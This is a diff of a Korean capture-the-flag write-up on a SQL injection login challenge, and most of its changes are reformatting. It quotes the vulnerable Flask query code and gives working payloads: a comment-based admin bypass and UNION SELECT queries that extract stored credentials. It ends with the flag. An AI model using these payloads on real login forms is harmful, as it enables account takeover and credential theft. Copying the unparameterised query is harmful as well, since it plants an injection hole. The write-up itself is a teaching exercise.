@@ -1,51 +1,32 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 1.1 SQL Injection - Login"
+title: "KnockOn Bootcamp 2nd - 1.1 SQL Injection - Login"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - SQL Injection
-  - Login
-last_modified_at: 2024-08-24T02:54:00-05:00
+  - Login Bypass
+last_modified_at: 2024-08-24T16:54:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10002/>
 
-![1.1 SQL Injection - Login 1](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_1.png)
+![1.1 SQL Injection - Login 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-1.png)
 
-![1.1 SQL Injection - Login 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)
+![1.1 SQL Injection - Login 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-2.png)
 
-![1.1 SQL Injection - Login 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)
-
-|
+![1.1 SQL Injection - Login 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-3.png)
 
 ### 목표
 
----
-
 admin 계정으로 로그인하기
-
-|
-
-|
 
 ### 공격 기법
 
----
-
 SQL Injection
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -112,19 +93,11 @@ if __name__ == "__main__":
 
 ```
 
-|
-
-|
-
-|
-
 ## 분석
 
 ### 메인 화면
 
----
-
-![1.1 SQL Injection - Login 4](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_4.png)
+![1.1 SQL Injection - Login 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-4.png)
 
 ```python
 SELECT * FROM user WHERE username = 'Usename 폼 입력값' AND password = 'Password 폼 입력값'
@@ -132,27 +105,17 @@ SELECT * FROM user WHERE username = 'Usename 폼 입력값' AND password = 'Pass
 
 값을 입력하면 위 형태로 쿼리가 실행되는 걸 확인할 수 있음
 
-|
-
-![1.1 SQL Injection - Login 5](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_5.png)
+![1.1 SQL Injection - Login 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-5.png)
 
 폼에 `‘` 를 입력하면 에러가 뜸
 
 사용자 입력을 제대로 처리하지 않고 쿼리를 직접 전달하는 것임
 
-쿼리를 조작하는 것이 가능하다는 것으로 SQL Injection이 가능함을 알 수 있음
-
-|
-
-|
-
-|
+쿼리를 조작하는 것이 가능는 것으로 SQL Injection이 가능함을 알 수 있음
 
 ## 코드 분석
 
 ### User()
-
----
 
 ```sql
 class User(db.Model):
@@ -171,21 +134,13 @@ user 테이블 생성
 
 user 테이블은 이러한 형태가 됨
 
-|
-
-|
-
 ### login()
-
----
 
 ```python
 if request.method == "POST":
 ```
 
-POST 방식으로 로그인 폼을 제출해야만 코드가 실행됨.
-
-|
+POST 방식으로 로그인 폼을 제출해야만 코드가 실행됨
 
 ```python
 username = request.form["username"]
@@ -196,8 +151,6 @@ password = request.form["password"]
 
 제출된 폼 데이터에서 “username”과 "password” 필드의 값을 request.form에서 가져와 각 변수에 저장
 
-|
-
 ```python
 query = text(
 	f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
@@ -205,8 +158,6 @@ query = text(
 ```
 
 폼 입력 값이 저장된 변수 `username`과 `password`로 쿼리를 동적으로 생성 → 공격 대상
-
-|
 
 ```python
 with db.engine.connect() as connection:
@@ -216,15 +167,11 @@ with db.engine.connect() as connection:
 
 블록 내부에서만 데이터베이스 연결을 유지하고 블록을 벗어나면 자동으로 연결 종료
 
-|
-
 ```python
 result = connection.execute(query)
 ```
 
 위에서 생성한 `query`변수에 담긴 SQL 쿼리 실행
-
-|
 
 ```python
 user = result.fetchone()
@@ -232,7 +179,7 @@ user = result.fetchone()
 
 `result`(쿼리 결과)에서 첫 번째 행을 가져와 `user` 변수에 저장
 
-쿼리가 정상적으로 실행된다면, `user` 변수는 **user 테이블의 행**을 나타냄
+쿼리가 정상적으로 실행됨면, `user` 변수는 **user 테이블의 행**을 나타냄
 
 즉,
 
@@ -241,8 +188,6 @@ user = result.fetchone()
 `user[1]` = **username 값**
 
 `user[2]` = **password 값**
-
-|
 
 ```python
 if user and user[1] == "admin":
@@ -253,8 +198,6 @@ if user and user[1] == "admin":
 
 `success` 뷰로 리다이렉트 후 `username`을 `user[1]`로, `flag`를 `LOGIN_FLAG`로 설정
 
-|
-
 ```python
 elif user:
 	return redirect(url_for("success", username=user[1]))
@@ -264,13 +207,7 @@ elif user:
 
 `success` 뷰로 리다이렉트 후 `username` 을 `user[1]` 로 설정
 
-|
-
-|
-
 ### success()
-
----
 
 ```python
 username = request.args.get("username", "Unknown")
@@ -286,31 +223,19 @@ return render_template("success.html", username=username, flag=flag)
 
 즉, **login()**에서 **"admin"**으로 로그인에 성공하면 `username`과 `flag`가 화면에 나타나게 됨
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ### 방법 1
-
----
 
 ```sql
 SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
 ```
-
-|
 
 ```sql
 SELECT * FROM user WHERE username = 'admin' AND password = '{password}'
 ```
 
 `username`이 **"admin"**이 되어야함
-
-|
 
 ```sql
 SELECT * FROM user WHERE username = 'admin' -- AND password = '{password}'
@@ -320,8 +245,6 @@ SELECT * FROM user WHERE username = 'admin' -- AND password = '{password}'
 
 주의해야 할 점이, 주석 처리를 하기 위해서는 주석 뒤에 최소 한 개의 공백이 존재해야함
 
-|
-
 ```sql
 admin' -- 1
 ```
@@ -330,11 +253,7 @@ admin' -- 1
 
 뒤에 1을 쓰는 이유는 공백이 있음을 명확하게 하기 위해서임. 아닐 수도 있음ㅋ
 
-`password`는 주석처리 될 운명이기 때문에 아무거나 넣어도 됨 
-
-|
-
-|
+`password`는 주석처리 될 운명이기 때문에 아무거나 넣어도 됨
 
 ### 방법 2
 
@@ -346,47 +265,37 @@ user 테이블의 형태는 이미 알고 있으므로
 
 `username`과 `password`를 조회하여 직접 **"admin"** 계정의 `password`를 알아낼 수 있음
 
-|
-
 ```sql
 ' union select 1,(select username from user limit 0,1),3 -- 1
 ```
 
-![1.1 SQL Injection - Login 6](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_6.png)
+![1.1 SQL Injection - Login 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-6.png)
 
 user 테이블의 첫 번째 행의 `username`은 “guest”
-
-|
 
 ```sql
 ' union select 1,(select password from user limit 0,1),3 -- 1
 ```
 
-![1.1 SQL Injection - Login 7](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_7.png)
+![1.1 SQL Injection - Login 7](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-7.png)
 
 `password`는 “password”
-
-|
 
 ```sql
 ' union select 1,(select username from user limit 1,1),3 -- 1
 ```
 
-![1.1 SQL Injection - Login 8](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_8.png)
+![1.1 SQL Injection - Login 8](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-8.png)
 
 두 번째 행의 `username`은 **“admin”**
-
-|
 
 ```sql
 ' union select 1,(select password from user limit 1,1),3 -- 1
 ```
 
-![1.1 SQL Injection - Login 9](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_9.png)
+![1.1 SQL Injection - Login 9](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-1-sql-injection-9.png)
 
 `password`는 **“strong_admin_password_it_cant_be_leak”**
-
-|
 
 정리하면,
 
@@ -399,13 +308,7 @@ user 테이블의 구조는 위와 같은 형태임을 알 수 있음
 
 이를 활용해 직접 로그인이 가능함
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### 방법 1
 
@@ -415,10 +318,6 @@ username: admin' -- 1
 password: 1
 ```
 
-|
-
-|
-
 ### 방법 2
 
 ```
@@ -427,16 +326,8 @@ username: admin
 password: strong_admin_password_it_cant_be_leak
 ```
 
-|
-
-|
-
 ### FLAG
 
 ```
 K0{y3s_1'm_4dm1n!!}
 ```
-
-|
-
----
